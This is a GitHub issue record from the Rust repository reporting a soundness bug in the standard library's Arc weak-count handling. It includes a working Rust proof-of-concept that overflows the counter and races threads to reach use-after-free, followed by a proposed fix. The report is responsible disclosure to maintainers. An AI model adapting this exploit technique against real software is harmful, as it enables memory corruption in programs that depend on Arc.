{"url": "https://api.github.com/repos/rust-lang/rust/issues/108706", "repository_url": "https://api.github.com/repos/rust-lang/rust", "labels_url": "https://api.github.com/repos/rust-lang/rust/issues/108706/labels{/name}", "comments_url": "https://api.github.com/repos/rust-lang/rust/issues/108706/comments", "events_url": "https://api.github.com/repos/rust-lang/rust/issues/108706/events", "html_url": "https://github.com/rust-lang/rust/issues/108706", "id": 1609112751, "node_id": "I_kwDOAAsO6M5f6Ryv", "number": 108706, "title": "Overflow in `Arc`", "user": {"login": "noamtashma", "id": 9135297, "node_id": "MDQ6VXNlcjkxMzUyOTc=", "avatar_url": "https://avatars.githubusercontent.com/u/9135297?v=4", "gravatar_id": "", "url": "https://api.github.com/users/noamtashma", "html_url": "https://github.com/noamtashma", "followers_url": "https://api.github.com/users/noamtashma/followers", "following_url": "https://api.github.com/users/noamtashma/following{/other_user}", "gists_url": "https://api.github.com/users/noamtashma/gists{/gist_id}", "starred_url": "https://api.github.com/users/noamtashma/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/noamtashma/subscriptions", "organizations_url": "https://api.github.com/users/noamtashma/orgs", "repos_url": "https://api.github.com/users/noamtashma/repos", "events_url": "https://api.github.com/users/noamtashma/events{/privacy}", "received_events_url": "https://api.github.com/users/noamtashma/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 60329014, "node_id": "MDU6TGFiZWw2MDMyOTAxNA==", "url": "https://api.github.com/repos/rust-lang/rust/labels/P-low", "name": "P-low", "color": "eb6420", "default": false, "description": "Low priority"}, {"id": 267612997, "node_id": "MDU6TGFiZWwyNjc2MTI5OTc=", "url": "https://api.github.com/repos/rust-lang/rust/labels/I-unsound", "name": "I-unsound", "color": "e11d21", "default": false, "description": "Issue: A soundness hole (worst kind of bug), see: https://en.wikipedia.org/wiki/Soundness"}, {"id": 650731663, "node_id": "MDU6TGFiZWw2NTA3MzE2NjM=", "url": "https://api.github.com/repos/rust-lang/rust/labels/C-bug", "name": "C-bug", "color": "f5f1fd", "default": false, "description": "Category: This is a bug."}, {"id": 2011781731, "node_id": "MDU6TGFiZWwyMDExNzgxNzMx", "url": "https://api.github.com/repos/rust-lang/rust/labels/T-libs", "name": "T-libs", "color": "bfd4f2", "default": false, "description": "Relevant to the library team, which will review and decide on the PR/issue."}, {"id": 4434017660, "node_id": "LA_kwDOAAsO6M8AAAABCEm9fA", "url": "https://api.github.com/repos/rust-lang/rust/labels/A-atomic", "name": "A-atomic", "color": "f7e101", "default": false, "description": "Area: atomics, barriers, and sync primitives"}], "state": "closed", "locked": false, "assignee": {"login": "noamtashma", "id": 9135297, "node_id": "MDQ6VXNlcjkxMzUyOTc=", "avatar_url": "https://avatars.githubusercontent.com/u/9135297?v=4", "gravatar_id": "", "url": "https://api.github.com/users/noamtashma", "html_url": "https://github.com/noamtashma", "followers_url": "https://api.github.com/users/noamtashma/followers", "following_url": "https://api.github.com/users/noamtashma/following{/other_user}", "gists_url": "https://api.github.com/users/noamtashma/gists{/gist_id}", "starred_url": "https://api.github.com/users/noamtashma/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/noamtashma/subscriptions", "organizations_url": "https://api.github.com/users/noamtashma/orgs", "repos_url": "https://api.github.com/users/noamtashma/repos", "events_url": "https://api.github.com/users/noamtashma/events{/privacy}", "received_events_url": "https://api.github.com/users/noamtashma/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "noamtashma", "id": 9135297, "node_id": "MDQ6VXNlcjkxMzUyOTc=", "avatar_url": "https://avatars.githubusercontent.com/u/9135297?v=4", "gravatar_id": "", "url": "https://api.github.com/users/noamtashma", "html_url": "https://github.com/noamtashma", "followers_url": "https://api.github.com/users/noamtashma/followers", "following_url": "https://api.github.com/users/noamtashma/following{/other_user}", "gists_url": "https://api.github.com/users/noamtashma/gists{/gist_id}", "starred_url": "https://api.github.com/users/noamtashma/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/noamtashma/subscriptions", "organizations_url": "https://api.github.com/users/noamtashma/orgs", "repos_url": "https://api.github.com/users/noamtashma/repos", "events_url": "https://api.github.com/users/noamtashma/events{/privacy}", "received_events_url": "https://api.github.com/users/noamtashma/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 10, "created_at": "2023-03-03T18:59:15Z", "updated_at": "2023-03-11T21:12:47Z", "closed_at": "2023-03-11T21:12:47Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I discovered a memory safety vulnerability in the standard library's `Arc`.\n\nBefore the rest of the issue, I just want to say thanks in advance to everyone involved for helping to keep rust safe \ud83e\udd80 :)\n\n### Description of the vulnerability:\nIn `Weak::clone`, the weak count is incremented using `fetch_add`, and then it's checked whether the result passed `MAX_REFCOUNT`. As is documented in `Arc::clone`'s code, this is because if the counter gets too close to overflowing, the overflow might happen before the call to `abort` completes, breaking Arc's invariants and probably causing UB. Checking if the counter passed `MAX_REFCOUNT` means that at least 2^15 (in 16-bit platforms) increments to the counter  before `abort` completes are needed for an overflow.\n\nHowever, in `Arc::downgrade`, the code increments the weak count, without checking that the counter doesn't pass `MAX_REFCOUNT` . This allows the counter to get all the way up to `usize::MAX - 1`. Then, using `Weak::clone`, we can get a much more favorable race than intended.\n\nTherefore, the attack is as follows:\n\nWe use `Arc::downgrade` to increment the weak count all the way to `usize::MAX - 1`, then run `Weak::clone` three times in parallel.\nThe first two will call `abort`, but the third will result in a weak count of 1, indicating that there are no remaining `Weak`s (while there actually are).\nThen we can abuse this broken invariant to cause UB, for example through `Arc::get_mut`, as long as we manage to do so before either of the two `abort` calls complete.\n\n### Demonstration of the vulnerability:\nNote than to run this exploit yourself, if you're running a 64-bit architecture, the exploit won't run in a reasonable length of time. So `Arc` has to be modified to lower the counter to 32-bits, to demonstrate the vulnerability.\n\n<details><summary> The exploit in code </summary>\n<p>\n\n```rust\ntype Counter = usize;\n\nfn exploit() {\n    println!(\"Started!\");\n    use std::boxed::Box;\n    use std::sync::*;\n    // use crate::sync::atomic::{AtomicBool, Ordering};\n\n    let arc = Arc::new(Box::new(7));\n\n    // Keep one of the weaks alive\n    let weak = Arc::downgrade(&arc);\n\n    // The weak count starts at `1`.\n    // Increase to `Counter::MAX - 1`.\n    for i in 0..Counter::MAX - 3 {\n        std::mem::forget(Arc::downgrade(&arc));\n        if i % 100000000 == 0 {\n            println!(\"{i} out of {}\", Counter::MAX);\n        }\n    }\n\n    let mutex_arc = std::sync::Mutex::new(Some(arc));\n\n    println!(\"Finished incrementing\");\n\n    // let start = AtomicBool::new(false);\n\n    // We run this function three times in parallel, to trigger our vulnerability.\n    let evil = || {\n        let id = std::thread::current().id();\n\n        // You can try this if some extra syncronization is wanted, to make all three threads\n        // start at the approximately same time. I didn't end up needing it, so I don't know if it even helps.\n        // loop {\n        //     if start.load(Ordering::Relaxed) {\n        //         break;\n        //     }\n        // }\n        let weak2 = weak.clone();\n        println!(\"{id:?}: Managed to clone!\");\n        // Take the `Arc`\n        let arc = mutex_arc.lock().unwrap().take();\n        let Some(mut arc) = arc else {\n            println!(\"{id:?}: Error: Arc already taken!\");\n            return;\n        };\n        println!(\"{id:?}: Arc taken!\");\n        // This will succeed even though we still have a `Weak`\n        let Some(val) = Arc::get_mut(&mut arc) else {\n            println!(\"{id:?}: Error: Failed to get unique access :(\");\n            return; // Didn't manage to exploit :(\n        };\n        println!(\"{id:?}: Succeeded!\");\n\n        let arc2 = weak2.upgrade().unwrap();\n        let also_val = &**arc2;\n        // `val` and `also_val` point to the same value.\n        println!(\"{id:?}: also_val: {also_val}\");\n        **val = 9;\n        println!(\"{id:?}: also_val: {also_val}\");\n        *val = Box::new(5);\n        // Now `also_val` points to freed memory\n        println!(\"{id:?}: also_val: {also_val}\");\n    };\n\n    std::thread::scope(|s| {\n        let _ = s.spawn(evil);\n        let _ = s.spawn(evil);\n        let _ = s.spawn(evil);\n        // let _ = s.spawn(|| {\n        //     start.store(true, Ordering::Relaxed);\n        // });\n    });\n\n    println!(\"Done.\\n\\n\\n\");\n}\n```\n</p>\n</details>\n\n<details><summary>Running on 64-bit architectures</summary>\n<p>\nThis is how I tested the exploit myself. I modified the `std` so that the counter would only be a `u32`, and ran the exploit as a \"test\", with this command:\n\n```\n> ./x.py --stage 0 test library/alloc --test-args \"exploit --nocapture\"\n```\n\nThis is also present [here](https://github.com/noamtashma/rust-arc-safety-bug/tree/Demo).\n\n</p>\n</details>\n\n\n### Fixing:\nThe fix is very simple. In the `Arc::downgrade` compare-exchange loop, add a check that if `cur > MAX_REFCOUNT`, and it's not `usize::MAX`, panic.\nAdd a comment explaining that not straying too much above `MAX_REFCOUNT` is a global invariant, and must be enforced in all increment operations.\n\n### Severity:\nI'm not sure how severe it is, since it depends on a race with `abort`, and I don't know how to assess winning this race in real code on different platforms.\n\nIt should also be noted that in order for this to be exploited, a large amount of `Weak`s need to be leaked (depending on `usize` size), without also leaking heap memory (otherwise the program would run out of memory first).\n\n\n<!-- TRIAGEBOT_START -->\n\n<!-- TRIAGEBOT_ASSIGN_START -->\n\n<!-- TRIAGEBOT_ASSIGN_DATA_START$${\"user\":\"noamtashma\"}$$TRIAGEBOT_ASSIGN_DATA_END -->\n\n<!-- TRIAGEBOT_ASSIGN_END -->\n<!-- TRIAGEBOT_END -->", "closed_by": {"login": "bors", "id": 3372342, "node_id": "MDQ6VXNlcjMzNzIzNDI=", "avatar_url": "https://avatars.githubusercontent.com/u/3372342?v=4", "gravatar_id": "", "url": "https://api.github.com/users/bors", "html_url": "https://github.com/bors", "followers_url": "https://api.github.com/users/bors/followers", "following_url": "https://api.github.com/users/bors/following{/other_user}", "gists_url": "https://api.github.com/users/bors/gists{/gist_id}", "starred_url": "https://api.github.com/users/bors/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/bors/subscriptions", "organizations_url": "https://api.github.com/users/bors/orgs", "repos_url": "https://api.github.com/users/bors/repos", "events_url": "https://api.github.com/users/bors/events{/privacy}", "received_events_url": "https://api.github.com/users/bors/received_events", "type": "User", "site_admin": false}, "reactions": {"url": "https://api.github.com/repos/rust-lang/rust/issues/108706/reactions", "total_count": 1, "+1": 0, "-1": 0, "laugh": 0, "hooray": 0, "confused": 0, "heart": 0, "rocket": 0, "eyes": 1}, "timeline_url": "https://api.github.com/repos/rust-lang/rust/issues/108706/timeline", "performed_via_github_app": null, "state_reason": "completed"}